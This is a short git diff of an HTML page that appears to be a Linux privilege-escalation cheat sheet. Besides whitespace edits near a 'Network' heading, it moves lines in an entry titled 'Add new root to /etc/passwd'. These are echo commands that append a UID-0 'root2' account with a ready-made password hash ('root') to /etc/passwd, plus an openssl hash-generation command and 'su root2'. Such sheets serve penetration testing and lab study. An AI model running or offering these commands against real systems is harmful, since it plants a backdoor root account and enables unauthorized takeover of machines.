@@ -276,9 +276,9 @@ layout: default
         </tr>
         <tr></tr>
     </table>
-
+    
     <li>Network</li>
-
+    
     <table>
         <tr>
             <td>Network interfaces and addresses</td>
@@ -726,16 +726,16 @@ layout: default
             <td>Add new root to /etc/passwd</td>
             <td>
                 <li>echo &quot;root2:&lt;hash&gt;:0:0:root:/root:/bin/bash&quot; &gt;&gt; /etc/passwd</li>
-                <li>echo &quot;root2:S3g6q5KuTzNkU:0:0:root:/root:/bin/bash&quot; &gt;&gt; /etc/passwd</li>
-                <ul>
-                    <li>password = root</li>
-                </ul>
                 <table>
                     <tr>
                         <td>Generate new password hash</td>
                         <td>openssl passwd &lt;password&gt;</td>
                     </tr>
                 </table>
+                <li>echo &quot;root2:S3g6q5KuTzNkU:0:0:root:/root:/bin/bash&quot; &gt;&gt; /etc/passwd</li>
+                <ul>
+                    <li>password = root</li>
+                </ul>
                 <li>su root2</li>
             </td>
         </tr>
